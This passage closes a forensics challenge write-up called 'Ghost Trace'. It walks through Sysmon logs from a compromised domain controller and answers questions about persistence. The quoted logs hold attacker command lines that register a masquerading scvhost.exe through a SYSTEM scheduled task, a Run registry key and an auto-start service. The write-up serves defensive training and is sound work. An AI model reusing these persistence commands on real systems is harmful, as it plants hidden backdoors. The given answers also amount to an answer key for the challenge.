      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 10
    Version: 3
    Level: 4
    Task: 10
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:38:59.849865Z
    EventRecordID: 152610
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
    UtcTime: 2025-05-25 04:38:59.839
    SourceProcessGUID: C1728745-9DB9-6832-3201-000000007200
    SourceProcessId: 2748
    SourceThreadId: 4116
    SourceImage: C:\Windows\system32\wsmprovhost.exe
    TargetProcessGUID: C1728745-9EE3-6832-3901-000000007200
    TargetProcessId: 316
    TargetImage: C:\Windows\system32\schtasks.exe
    GrantedAccess: '0x1fffff'
    CallTrace: C:\Windows\SYSTEM32\ntdll.dll+a0864|C:\Windows\System32\KERNELBASE.dll+31a89|C:\Windows\System32\KERNELBASE.dll+80fb6|C:\Windows\System32\KERNEL32.DLL+1c7c4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\18195476b780b04f355b39f48f10cc25\System.ni.dll+384146|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\18195476b780b04f355b39f48f10cc25\System.ni.dll+2c4809|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\18195476b780b04f355b39f48f10cc25\System.ni.dll+2c4179|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+111f089|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+10762da|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+110096d|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+110062b|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\a3bcadd89102c16f39eea68579b45e51\System.Management.Automation.ni.dll+1203a8f|UNKNOWN(00007FF9032640D1)
    SourceUser: MAIN\Administrator
    TargetUser: MAIN\Administrator

---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 7
    Version: 3
    Level: 4
    Task: 7
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:38:59.915930Z
    EventRecordID: 152611
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1053,technique_name=Scheduled Task
    UtcTime: 2025-05-25 04:38:59.901
    ProcessGuid: C1728745-9EE3-6832-3901-000000007200
    ProcessId: 316
    Image: C:\Windows\System32\schtasks.exe
    ImageLoaded: C:\Windows\System32\taskschd.dll
    FileVersion: 10.0.20348.1 (WinBuild.160101.0800)
    Description: Task Scheduler COM API
    Product: Microsoft® Windows® Operating System
    Company: Microsoft Corporation
    OriginalFileName: taskschd.dll
    Hashes: SHA1=F7151ED9C53B2095B2FF1294971C63C6F4739167,MD5=1A49668C0AD5E92F0CEF9F0EF99607A9,SHA256=98920100ECE3236CB579E24DB926CA66ACB05F7018F85DD9C40C1865F86D9041,IMPHASH=530A68E05D91DD5F4F3210E15EFA9CB5
    Signed: 'true'
    Signature: Microsoft Windows
    SignatureStatus: Valid
    User: MAIN\Administrator

[+] Found 9 hits
❯
```

The attacker utilized the legitimate `schtasks.exe` tool to register a scheduled task masquerading as a system update check. The task is configured to run with `SYSTEM` privileges, ensuring that the malicious binary (obfuscated under the name `scvhost.exe`) maintains an active connection even after server reboots. This activity was detected via **Sysmon Event ID 1**, which captured the full command line used for the task creation.

##### Answer: `WindowsUpdateCheck`

## TASK 16
What is the registry key name created by the attacker on DC01 for persistence?

```
❯ chainsaw search "scvhost.exe" Sysmon.evtx

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

[+] Loading forensic artefacts from: Sysmon.evtx
[+] Loaded 1 forensic files (2.1 MiB)
[+] Searching forensic artefacts...
---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 11
    Version: 2
    Level: 4
    Task: 11
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:37:14.665878Z
    EventRecordID: 152592
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: '-'
    UtcTime: 2025-05-25 04:37:14.662
    ProcessGuid: C1728745-9DB9-6832-3201-000000007200
    ProcessId: 2748
    Image: C:\Windows\system32\wsmprovhost.exe
    TargetFilename: C:\Windows\System32\scvhost.exe
    CreationUtcTime: 2025-05-25 04:37:14.662
    User: MAIN\Administrator

---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 1
    Version: 5
    Level: 4
    Task: 1
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:38:53.022639Z
    EventRecordID: 152600
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1053.005,technique_name=Scheduled Task/Job
    UtcTime: 2025-05-25 04:38:53.011
    ProcessGuid: C1728745-9EDD-6832-3701-000000007200
    ProcessId: 1216
    Image: C:\Windows\System32\schtasks.exe
    FileVersion: 10.0.20348.1 (WinBuild.160101.0800)
    Description: Task Scheduler Configuration Tool
    Product: Microsoft® Windows® Operating System
    Company: Microsoft Corporation
    OriginalFileName: schtasks.exe
    CommandLine: '"C:\Windows\system32\schtasks.exe" /create /tn WindowsUpdateCheck /tr C:\Windows\System32\scvhost.exe /sc onstart /ru SYSTEM /f'
    CurrentDirectory: C:\Users\Administrator\Documents\
    User: MAIN\Administrator
    LogonGuid: C1728745-9DB9-6832-21CE-3C0000000000
    LogonId: '0x3cce21'
    TerminalSessionId: 0
    IntegrityLevel: High
    Hashes: SHA1=C7548A5CBF90C68A1396147BF7B9E878C7DF8B4C,MD5=A5C613AE2541EE5FFB83E2882DC148C2,SHA256=7AFCC83C671A6142996A2F6BE94D533D000D943A8BA2293851A4232B76FA29AD,IMPHASH=44E70F20C235C150D75F6FC8B1E29CD1
    ParentProcessGuid: C1728745-9DB9-6832-3201-000000007200
    ParentProcessId: 2748
    ParentImage: C:\Windows\System32\wsmprovhost.exe
    ParentCommandLine: C:\Windows\system32\wsmprovhost.exe -Embedding
    ParentUser: MAIN\Administrator

---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 1
    Version: 5
    Level: 4
    Task: 1
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:40:09.273865Z
    EventRecordID: 152615
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1012,technique_name=Query Registry
    UtcTime: 2025-05-25 04:40:09.243
    ProcessGuid: C1728745-9F29-6832-3D01-000000007200
    ProcessId: 6436
    Image: C:\Windows\System32\reg.exe
    FileVersion: 10.0.20348.1 (WinBuild.160101.0800)
    Description: Registry Console Tool
    Product: Microsoft® Windows® Operating System
    Company: Microsoft Corporation
    OriginalFileName: reg.exe
    CommandLine: '"C:\Windows\system32\reg.exe" add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v xcvafctr /t REG_SZ /d C:\Windows\System32\scvhost.exe /f'
    CurrentDirectory: C:\Users\Administrator\Documents\
    User: MAIN\Administrator
    LogonGuid: C1728745-9DB9-6832-21CE-3C0000000000
    LogonId: '0x3cce21'
    TerminalSessionId: 0
    IntegrityLevel: High
    Hashes: SHA1=E65FAA187D27D84106B78B909C06D405837EC64E,MD5=EB20E119AAF500E2752DC5A588B54C12,SHA256=C6A168C81654F5901E864C8FD61FA54F084CD8B2E0A8AC1B83EACF9EB4484F75,IMPHASH=E23A24F7BA9B35B3E9706724F6749860
    ParentProcessGuid: C1728745-9DB9-6832-3201-000000007200
    ParentProcessId: 2748
    ParentImage: C:\Windows\System32\wsmprovhost.exe
    ParentCommandLine: C:\Windows\system32\wsmprovhost.exe -Embedding
    ParentUser: MAIN\Administrator

---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 13
    Version: 2
    Level: 4
    Task: 13
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:40:09.335082Z
    EventRecordID: 152617
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1547.001,technique_name=Registry Run Keys / Start Folder
    EventType: SetValue
    UtcTime: 2025-05-25 04:40:09.325
    ProcessGuid: C1728745-9F29-6832-3D01-000000007200
    ProcessId: 6436
    Image: C:\Windows\system32\reg.exe
    TargetObject: HKU\S-1-5-21-620716483-2719109048-3577772375-500\Software\Microsoft\Windows\CurrentVersion\Run\xcvafctr
    Details: C:\Windows\System32\scvhost.exe
    User: MAIN\Administrator

---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 2
    Version: 5
    Level: 4
    Task: 2
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:40:57.242479Z
    EventRecordID: 152654
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1099,technique_name=Timestomp
    UtcTime: 2025-05-25 04:40:57.231
    ProcessGuid: C1728745-830A-6832-4600-000000007200
    ProcessId: 2652
    Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MsMpEng.exe
    TargetFilename: C:\Windows\System32\scvhost.exe
    CreationUtcTime: 2025-05-25 04:37:14.662
    PreviousCreationUtcTime: 2025-05-25 04:37:14.662
    User: NT AUTHORITY\SYSTEM

---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 1
    Version: 5
    Level: 4
    Task: 1
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:43:01.270199Z
    EventRecordID: 152659
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: technique_id=T1543.003,technique_name=Windows Service
    UtcTime: 2025-05-25 04:43:01.264
    ProcessGuid: C1728745-9FD5-6832-4701-000000007200
    ProcessId: 6232
    Image: C:\Windows\System32\sc.exe
    FileVersion: 10.0.20348.1 (WinBuild.160101.0800)
    Description: Service Control Manager Configuration Tool
    Product: Microsoft® Windows® Operating System
    Company: Microsoft Corporation
    OriginalFileName: sc.exe
    CommandLine: '"C:\Windows\system32\sc.exe" create WindowsUpdateSvc binPath= C:\Windows\System32\scvhost.exe start= auto'
    CurrentDirectory: C:\Users\Administrator\Documents\
    User: MAIN\Administrator
    LogonGuid: C1728745-9DB9-6832-21CE-3C0000000000
    LogonId: '0x3cce21'
    TerminalSessionId: 0
    IntegrityLevel: High
    Hashes: SHA1=75881652F0F9384DE229AB396BF27F1DDA244BBC,MD5=6FB10CD439B40D92935F8F6A0C99670A,SHA256=2BF663EA493CDC21AD33AEBD8DA40CC5D2AFA55E24F9E1BBF3D73E99DCADF693,IMPHASH=803254E010814E69947095A2725B2AFD
    ParentProcessGuid: C1728745-9DB9-6832-3201-000000007200
    ParentProcessId: 2748
    ParentImage: C:\Windows\System32\wsmprovhost.exe
    ParentCommandLine: C:\Windows\system32\wsmprovhost.exe -Embedding
    ParentUser: MAIN\Administrator

---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 13
    Version: 2
    Level: 4
    Task: 13
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-05-25T04:43:01.342435Z
    EventRecordID: 152664
    Correlation: null
    Execution_attributes:
      ProcessID: 2132
      ThreadID: 4912
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: DC01.Main.local
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: '-'
    EventType: SetValue
    UtcTime: 2025-05-25 04:43:01.336
    ProcessGuid: C1728745-82F1-6832-0B00-000000007200
    ProcessId: 700
    Image: C:\Windows\system32\services.exe
    TargetObject: HKLM\System\CurrentControlSet\Services\WindowsUpdateSvc\ImagePath
    Details: C:\Windows\System32\scvhost.exe
    User: NT AUTHORITY\SYSTEM

[+] Found 7 hits
```

Let’s take a closer look at the details of that registration event
**Image:** `C:\Windows\system32\reg.exe` (The attacker used the `reg add` command to do this).
**UtcTime:** `2025-05-25 04:40:09`
**TargetObject:** `HKU\S-1-5-21-620716483-2719109048-3577772375-500\Software\Microsoft\Windows\CurrentVersion\Run\xcvafctr`
**Details:** `C:\Windows\System32\scvhost.exe`

##### Answer: `xcvafctr`

With this, the Sherlock "Ghost Trace" concludes! See you in another writeup!
